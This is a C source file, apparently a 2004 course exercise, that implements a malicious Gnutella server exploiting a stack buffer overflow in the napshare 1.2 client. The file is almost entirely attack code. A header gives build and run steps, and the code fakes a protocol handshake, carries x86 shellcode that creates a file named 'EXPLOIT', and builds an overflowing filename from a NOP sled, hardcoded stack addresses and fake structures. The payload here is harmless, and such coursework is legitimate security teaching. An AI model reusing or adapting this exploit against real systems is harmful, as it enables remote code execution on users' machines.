/*
 * napshare_srv.c
 * 2004.12.06
 * Bartlomiej Sieka
 *
 * This program generates the injection vector used to exploit a buffer
 * overflow in napshare version 1.2 (file auto.c, function
 * auto_filter_extern.c, buffer is "filename"). Program uses a slightly
 * modified payload provided by Professor Daniel J. Bernstein in the
 * Fall 2004 MCS 494 course at UIC.
 *
 * This program should be used with the tcpserver(1) to allow a running
 * napshare client to make connections to it.
 * The recipe:
 * Issue the following commands:
 * gcc -o napshare_srv napshare_srv
 * tcpserver 0 50000 ./napshare_srv &
 * napshare
 *
 * In the napshare program do the following:
 * - Connect to peer 127.0.0.1:50000 (type the ip:port on the "gnutellaNet"
 *   screen in the text input field to the right of the "Add" button
 *   and then click "Add").
 * - Add new "extern" filter. (On the "Automation" screen input "test",
 *   "test" and "extern" into "Search", "Strings" and "Filters" input
 *   fields, respectively. Then click "Add to list".)
 * - Start the automation function. (On the "Automation" screen click
 *   on the "Start Automation" button).
 * After about 20 seconds a file called "EXPLOIT" will be created in
 * the current working directory an the napshare program will exit.
 */

#include<stdio.h>
#include<fcntl.h>
#include<arpa/inet.h>
#include<assert.h>
#include <sys/time.h>
#include <signal.h>

#define NODEBUG


/*
 * Messages used to establish a connection
 */
const char * Connect = "GNUTELLA CONNECT/";
const char * OK = 
"GNUTELLA/0.6 200 OK\r\n\
Pong-Caching: 0.1\r\n\
Accept-Encoding: deflate\r\n\
X-Locale-Pref: fr\r\n\
X-Guess: 0.1\r\n\
Content-Encoding: deflate\r\n\
X-Max-TTL: 3\r\n\
Vendor-Message: 0.1\r\n\
X-Ultrapeer-Query-Routing: 0.1\r\n\
X-Query-Routing: 0.1\r\n\
Listen-IP: 81.56.202.32:6346\r\n\
X-Ext-Probes: 0.1\r\n\
Remote-IP:.69.211.109.203\r\n\
GGEP: 0.5\r\n\
X-Dynamic-Querying: 0.1\r\n\
X-Degree: 32\r\n\
User-Agent: LameWare/9.9.7.(0xdeadbeef)\r\n\
X-Ultrapeer: True\r\n\
X-Try-Ultrapeers: 69.28.37.190.69:6348\r\n\
\r\n";

const char * End = "\r\n\r\n"; /* this is a stupid idea */


/*
 * A simple payload creating a file called "EXPLOIT",
 * based on the code provided by Daniel J. Bernstein.
 */
char code[] = {
  0x59                         /*   cx = *sp++                      */
, 0x31, 0xc0                   /*   ax ^= ax                        */
, 0x88, 0x41, 0x07             /*   NULL-terminate the EXPLOIT str  */
, 0x40                         /*   ++ax                            */
, 0x40                         /*   ++ax                            */
, 0x40                         /*   ++ax                            */
, 0xc1, 0xe0, 0x07             /*   ax <<= 7                        */
, 0x50                         /*   *--sp = ax                 0600 */
, 0xb8, 0x12, 0x34, 0x56, 0x02 /*   ax = 0x02563412                 */
, 0xc1, 0xe8, 0x18             /*   ax >>= 24                       */
, 0xc1, 0xe0, 0x08             /*   ax <<= 8                        */
, 0x50                         /*   *--sp = ax          512:O_CREAT */
, 0x51                         /*   *--sp = cx          "EXPLOITED" */
, 0x31, 0xc0                   /*   ax ^= ax                        */
, 0xb0, 0x05                   /*   ax = (ax & ~255) + 5            */
, 0x50                         /*   *--sp = ax               5:open */
, 0xcd, 0x80                   /*   syscall                         */
, 0x31, 0xc0                   /*   ax ^= ax                        */
, 0x50                         /*   *--sp = ax                    0 */
, 0x40                         /*   ++ax                            */
, 0x50                         /*   *--sp = ax               1:exit */
, 0xcd, 0x80                   /*   syscall                         */
} ;


/* all output intened for the user should go here */
FILE * out_stream;


#define PING_DESCR 0x00
#define PONG_DESCR 0x01
#define PUSH_DESCR 0x40
#define QUERY_DESCR 0x80
#define QUERYHIT_DESCR 0x81

#define MAX_IV 16000
#define MAX_PAYLOAD_SIZE 16000
#define MAX_PAYLOAD_LEN 16000
#define HDR_SIZE 23
#define MSG_ID_SIZE 16

char Hdr[HDR_SIZE];
char Payload[MAX_PAYLOAD_SIZE];
char * MsgIdBogus = "%%%%____\000\000\000\000\n\n\n\n";

char MsgId[MSG_ID_SIZE];

char Ttl;
char Hops;

char c;

uint32_t Len;


int
dump_fd(int fd, unsigned count);

int
parse_query_payload(int fd, unsigned payload_len, char * criteria);

void send_ping(int fd);
void send_pong(int fd);
void send_queryhit(int fd, char *criteria, char *descr_id);

void
set_descr_hdr(char * Hdr,
	      char * msg_id,
	      char descr,
	      char ttl, 
	      char hops,
	      uint32_t len);

void
random_array(unsigned int n, char * array);

int
write_buf(int fd, char *buf, unsigned size);

/* XXX should this really be here...? */
uint16_t port;
uint32_t ip;
int net_out_fd;


/* send the Ping message periodically */
void timer_send_ping(int signal){
  fprintf(out_stream, "Sending Ping message\n");
  send_ping(net_out_fd);
  fflush(out_stream);
}


/***************************************************************************
 * main
 */
int
main(int argc, char * argv[]){
unsigned int seed;
  int net_in_fd = 0;
  char *msg;
  char criteria[4096];
  char c;  
  char buf[1024];
  int num_read;
  
  int net_out_fd = 1;
  struct itimerval itv;


  /* set up the local output stream */
  if((out_stream = fopen("/dev/tty", "w")) == NULL){
    perror("Can't open /dev/tty");
    /* let's use stderr instead */
    out_stream = stderr;
  }
  
  if(signal(SIGALRM, timer_send_ping) == SIG_ERR){
    fprintf(out_stream, "Couldn't set the signal handler");
    exit(1);
  }
  
  itv.it_interval.tv_sec = 5;
  itv.it_interval.tv_usec = 0;  
  itv.it_value.tv_sec = 5;
  itv.it_value.tv_usec = 0;
  
  /* that stupid client closes the connection after 15 secs */
  if(setitimer(ITIMER_REAL, &itv, 0x00) == -1){
    fprintf(out_stream, "Couldn't set the signal handler");
    exit(1);
  }

  // make a connection with the client  

  // read the begining     
  num_read = read(net_in_fd, buf, sizeof(Connect));
  if(num_read != sizeof(Connect)){
    fprintf(out_stream, "Can't read \"Connect\" from the net\n");
    exit(1);
  }
  
  // maybe later compare what's read with "Connect":    if(strncpy

  // now read read everything until the final "\n\n"
  num_read = read(net_in_fd, buf, strlen(End));
  if(num_read != strlen(End)){
    fprintf(out_stream, "Connection closed before double \\n\n");
    exit(1);       
  }
  
  while(strncmp(buf, End, strlen(End)) != 0){
    fprintf(out_stream, "%s\n", buf);

    // shift the buffer by one
    int i;
    for(i = 0; i < strlen(End) - 1; i++){
      buf[i] = buf[i+1];
    }
    num_read = read(net_in_fd, &buf[strlen(End) - 1], 1);
    if(num_read != 1){
      fprintf(out_stream, "Connection closed before double \\n\n");
      exit(1);
    }
  }


  // let's connect
  write(net_out_fd, OK, strlen(OK));
  fprintf(out_stream, "Connected (hopefully)\n");

  /* Now the peer will send the OK message, read it */  
  dump_fd(net_in_fd, strlen("GNUTELLA/0.6 200 OK\r\n\r\n"));

  unsigned char payload_descr;
  unsigned payload_len;
  char payload[MAX_PAYLOAD_LEN];
  char descr_id[16];

  int queryhit_sent = 0;

  while(1){
    if(!read_header(net_in_fd,
		    &payload_descr,
		    &payload_len,
		    descr_id)) break;
    assert(payload_len <= MAX_PAYLOAD_LEN);
    switch(payload_descr){
    case PING_DESCR:
      /* the payload lenght should be zero */
      fprintf(out_stream, "Received a Ping message\n");
      if(payload_len != 0){
	fprintf(out_stream, "Payload for Ping > 0 !\n");
      }
      fprintf(out_stream, "Sending a Pong message\n");
      send_pong(net_out_fd);      
      break;
    case PONG_DESCR:
    /* show the payload */
      fprintf(out_stream, "Received a Pong message\n");
      if(!dump_fd(net_in_fd, payload_len)) break;
      break;      
    case QUERY_DESCR:
      /* parse the payload */
      fprintf(out_stream, "Received a Query message\n");
      if(!parse_query_payload(net_in_fd, payload_len, criteria)) break;
      if(!queryhit_sent){
	queryhit_sent = 1;
	fprintf(out_stream, "Sending a QueryHit message\n");
	send_queryhit(net_out_fd, criteria, descr_id);
	fprintf(out_stream, "QueryHit sent\n");
      } else {
	fprintf(out_stream, "NOT sending a QueryHit message\n");		
      }
      break;
    case PUSH_DESCR:
      /* show the payload */
      fprintf(out_stream, "Received a Push message\n");
      if(!dump_fd(net_in_fd, payload_len)) break;
      break;      
    }
  }
}/* main() ****************************************************************/


/*
 *
 * function definitions
 *
 */


/***************************************************************************
 * Write a Ping message into fd
 */
void
send_ping(int fd){
  char * msg_id;
  /* get a random message id */
  random_array(MSG_ID_SIZE, MsgId);
  msg_id = MsgId;
  Len = 0;
  set_descr_hdr(Hdr, msg_id, PING_DESCR, rand() % 256, rand() % 256, Len);
  write_buf(fd, Hdr, HDR_SIZE);
}/* send_ping() ***********************************************************/


/***************************************************************************
 * Write a Pong message into fd
 */
void
send_pong(int fd){
  char * msg_id;
  unsigned payload_len;

  ip = 0x0100007f;
  port = 50000;

  /* get a random message id */
  random_array(MSG_ID_SIZE, MsgId);
  msg_id = MsgId;
  Len = 14;

  set_descr_hdr(Hdr, msg_id, PONG_DESCR, 5, 0, Len);
  if(!write_buf(fd, Hdr, HDR_SIZE)){
    fprintf(out_stream, "send_pong(): couldn't send header\n");
  }

  /*
   * Payload[0]-[1]: port number
   * Payload[2]-[5]: IP (little endian)
   * Payload[6]-[9]: # files shared
   * Payload[10]-[13]: # kilobytes shared
   */

  payload_len = Len;
  random_array(payload_len, Payload);
  memcpy(&Payload[0], &port, 2);
  memcpy(&Payload[2], &ip, 4);
  if(!write_buf(fd, Payload, payload_len)){
    fprintf(out_stream, "send_pong(): couldn't send payload\n");
  }
}/* send_pong() ***********************************************************/


/***************************************************************************
 * Write a QueryHit message into fd
 * criteria: null-terminated search criteria
 * descr_id: descr. of the Query msg (16 bytes)
 */
void
send_queryhit(int fd, char *criteria, char *descr_id){

  unsigned payload_len;
  char number_hits = 1;
  uint16_t speed;
  char servent_id[16];
  char result_set[MAX_IV];
  unsigned result_set_len;
  ip = 0x7f000001;
  port = 60000;

  result_set_len = set_result_set(result_set, criteria);

  assert(result_set_len <= MAX_IV);

  /* size
   * 1 : Payload[0]: number if hits
   * 2 : Payload[1-2]: port
   * 4 : Payload[3-6]: ip
   * 4 : Payload[7-10]: speed kb/s
   * ? : Payload[11-n-1]: result set
   * 16: Payload[n-n+16] servenet it
   */
  payload_len = 1 + 2 + 4 + 4 + result_set_len + 16;

  set_descr_hdr(Hdr, descr_id, QUERYHIT_DESCR, 5, 0, payload_len);
  if(!write_buf(fd, Hdr, HDR_SIZE)){
    fprintf(out_stream, "send_pong(): couldn't send header\n");
  }

  random_array(payload_len, Payload);
  memcpy(&Payload[0], &number_hits, 1);
  memcpy(&Payload[1], &port, 1);
  memcpy(&Payload[3], &ip, 4);
  memcpy(&Payload[7], &speed, 4);
  memcpy(&Payload[11], result_set, result_set_len);
  memcpy(&Payload[11 + result_set_len], servent_id, 16);
  
  if(!write_buf(fd, Payload, payload_len)){
    fprintf(out_stream, "send_pong(): couldn't send payload\n");
  }
}/* send_queryhit() *******************************************************/


/***************************************************************************
 * Copy the parts of the Descriptor Header to the msg buffer
 */
void
set_descr_hdr(char * msg,
	      char *msg_id,
	      char descr,
	      char ttl, 
	      char hops,
	      uint32_t len){

  uint32_t len_net = htonl(len);
  
  memcpy(msg, msg_id, MSG_ID_SIZE);
  memcpy(msg + MSG_ID_SIZE, &descr, 1);
  memcpy(msg + MSG_ID_SIZE + 1, &ttl, 1);
  memcpy(msg + MSG_ID_SIZE + 2, &hops, 1);
  /* some problems with endianess... */
  /*  memcpy(msg + MSG_ID_SIZE + 3, &len_net, sizeof(uint32_t)); */
  memcpy(msg + MSG_ID_SIZE + 3, &len, sizeof(uint32_t)); 
}/* set_descr_header() ****************************************************/


/***************************************************************************
 * Create a random array of n bytes at array (assume memory is allocated)
 */
void
random_array(unsigned int n, char * array){
  int i;
  for(i = 0; i < n; i++){
    *(array + i) = rand() % 256;
  } 
}/* random_array() *********************************************************/


/***************************************************************************
 * write a buffer
 */
int
write_buf(int fd, char *buf, unsigned size){
  int ret;

#ifdef DEBUG
  int i;
  fprintf(out_stream, "write_buf(): writing %d bytes:\n", size);
  for(i = 0; i < size; i++)
    fprintf(out_stream, "%.2hhx ", buf[i]);
  fprintf(out_stream, "\n");
#endif
  
  if((ret = write(fd, buf, size)) == -1){
    perror("write_buf(): write failed");
    return 0;
  } else if(ret < size){
    /* couldn't write the whole thing. hmm... */
    fprintf(out_stream, "Written only %d bytes out of %d\n", ret, size);
    return 0;
  }
  return 1;
}/* write_buf() ***********************************************************/



int
dump_fd(int fd, unsigned count){
  int i;
  char c;
  for(i = 0; i < count; i ++){
    if(read(fd, &c, 1) != 1) {perror("Can't read"); return 0;};
    fprintf(out_stream, "%.3d: 0x%.2hhx %c\n", i+1, c, c);
  }
  return 1;
}




/***************************************************************************
 * Reads a Gnutella hader from the given file descriptor.
 * payload_descr: set to the descritor read
 * payload_len: set to the lenght read
 * returns 1 if there were enough bytes read, 0 otherwise
 */
int
read_header(int net_in_fd,
	    char * payload_descr,
	    unsigned int * payload_len,
	    char * descr_id){
  int ret;
  char header[23];
  ret = read(net_in_fd, header, 23);
  if(ret == -1){
    fprintf(out_stream, "read_header(): read() failed\n");
  } 
  if(ret < 23){
    fprintf(out_stream, "can't read the full header, read %d bytes\n", ret);
    return 0;
  }    
  /* header[0]-[15] : message id, or descriptor id */
  /* header[16]     : payload descriptor */
  /* header[17]     : ttl */
  /* header[18]     : Hops */
  /* header[19]-[22]: payload lenght */
  memcpy(descr_id, header, 16);

  *payload_descr = header[16];

  /* Gnutella 0.4 specs says that stuff is little-endian, but it lies */
  /*  *payload_len = ntohl(*(uint32_t *)&header[19]); */
  *payload_len = *(uint32_t*)&header[19];
  fprintf(out_stream, "Payload descr : 0x%.2hhx\n", header[16]);
  fprintf(out_stream, "TTL           : 0x%.2hhx\n", header[17]);
  fprintf(out_stream, "Hops          : 0x%.2hhx\n", header[18]);
  fprintf(out_stream, "Payload len(b): 0x%.2hhx", header[19]);
  fprintf(out_stream, "%.2hhx", header[20]);
  fprintf(out_stream, "%.2hhx", header[21]);
  fprintf(out_stream, "%.2hhx\n", header[22]);
  fprintf(out_stream, "Payload len   : %d\n", *payload_len);
  return 1;
}/* read_header() *********************************************************/


/***************************************************************************
 * payload[0-1]: min speed in kb/sec
 * payload[2-payload_len-1]: search criteria, null terminated
 *
 */
int
parse_query_payload(int fd, unsigned payload_len, char * criteria){
  int i;
  char payload[MAX_IV];
  if(read(fd, payload, payload_len) != payload_len) return 0;

  fprintf(out_stream, "speed %d\n", payload[0] + 0xff * payload[1]);
  if(payload[payload_len - 1] != 0x00){
    fprintf(out_stream, "parse_query_payload(): serach criteria not null\
 termintaed (%.2hhx), fixing it", payload[payload_len - 1]);
    payload[payload_len - 1] = 0x00;
  }
  assert(payload_len > 2);
  strcpy(criteria, &payload[2]);
  fprintf(out_stream, "search criteria: %s\n", criteria);
  return 1;
}/* parse_query_payload() *************************************************/


/***************************************************************************
 * builds the result_set for the QueryHit message. The file name
 * is where the IV should go.
 * result_set[0-3] : file index
 * result_set[4-7] : file size in bytes
 * resutl_set[8-?] : 0x0000 terminated file name
 * result_set: store the result set there (mem already allocated)
 * criteria: serach criteria from the Query msg - in case the peer
 * would some checks to see if the file name in the QueryHit corelates
 * with the criteria sent. napshare doesn't do anything like this, so
 * this parameter is not used.
 * returns: the size of the result set
 */
int
set_result_set(char *result_set, char *criteria){
  char iv[MAX_IV];
  char *index = "iiii";
  char *size = "ssss";
  char doublenull[] = {0x00, 0x00};
  char *s;
  char *end;
  char *tmp;
  int i;

  s = iv;
  /* we need 10736 - 4 bytes to overflow the ip */
  end = s + 10736 - 4;

  /* let's build the injection vector */
  /* if will be stored in the filename array, &filename = 0xbfbfbc50 */
  
  /* nop sled */
  for(i = 0; i < 128; i ++){
    *(s++) = 0x90;
  }

  /* payload */
  *(s++) = 0xeb;
  *(s++) = sizeof(code);
  for (i = 0; i < sizeof code; i++)
    *(s++) = code[i];
  *(s++) = 0xe8;
  *(s++) = 251 - sizeof code;
  *(s++) = 0xff;
  *(s++) = 0xff;
  *(s++) = 0xff;
  tmp = "EXPLOIT";
  while(*(tmp)) *(s++) = *(tmp++);

  /* XXX: these address calculations are incorrect, but it works anyway */
  /* we should be now at 0xbfbfbc80 + s-iv */
  /* let's get to a 0xff boundary */
  while((s - iv + 0xbfbfbc80) < 0xbfbfbf00 ) *(s++) = (s-end) % 24 + 65;
  
  /*
   * simutale the rc and r structures on the stack - to prevent
   * segmentation faults in g_snprintf() and strcpy()
   */  
  /* 0xbfbfbf00 - address of the rc stucture */
  for(i = 0; i < 63; i++){
    *(s++) = i ? i*4 : 0xff;
    *(s++) = 0xbf;
    *(s++) = 0xbf;
    *(s++) = 0xbf;    
  }
    
  while(s != end) *(s++) = (s-end) % 24 + 65;
  
  /* iv starts at 0xbfbfbc50 */
  /* smasher = 0xbfbfbcc0 */
  *(s++) = 0xc0;
  *(s++) = 0xbc;
  *(s++) = 0xbf;
  *(s++) = 0xbf;

  /*
   * Need to preserve following function call arguments to survive until
   * return from the function: rc, r, string. 
   */

  /* rc
   * rc is allocated on the heap and its address varies from execution
   * to execution. Let's just point it to an address on the stack that
   * we control.
   */
  *(s++) = 0x30;
  *(s++) = 0xbf;
  *(s++) = 0xbf;
  *(s++) = 0xbf;

  /* r
   * r's address doesn't change and it's 0x8102a00 - can't send it though,
   * because of the 0x00 byte. Let us use a stack location then. (Note
   * that we could probably use the strcpy() to write that 0x00 byte).
   */
  *(s++) = 0x30;
  *(s++) = 0xbf;
  *(s++) = 0xbf;
  *(s++) = 0xbf;
  
  /* string
   * string's address doesn't change and it's 0x08097a20 - let's just
   * preserve it.
   */  
  *(s++) = 0x20;
  *(s++) = 0x7a;
  *(s++) = 0x09;
  *(s++) = 0x08;
  
  /* null-terminate for the strlen() below  to work */
  *s = 0x00;

  /* we have all the parts, build the result set */
  memcpy(&result_set[0], index, 4);
  memcpy(&result_set[4], size, 4);
  memcpy(&result_set[8], iv, strlen(iv));
  memcpy(&result_set[8 + strlen(iv)], doublenull, 2);

  return 4 + 4 + strlen(iv) + 2;
}/* set_result_set() ******************************************************/